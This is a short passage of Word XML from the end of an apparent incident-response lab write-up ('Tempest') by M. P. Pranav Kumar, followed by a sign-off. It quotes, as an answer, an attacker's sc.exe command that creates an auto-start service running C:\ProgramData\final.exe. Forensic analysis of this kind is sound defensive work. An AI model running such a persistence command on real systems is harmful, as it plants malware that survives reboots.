    <w:p>
      <w:r>
        <w:t>ANS : C:\Windows\system32\sc.exe” \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Alright!! FInally we finished Incident Responds !! I am going to off the system bye</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Thanks for reading :)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br/>
        <w:t>Written by M. P. Pranav Kumar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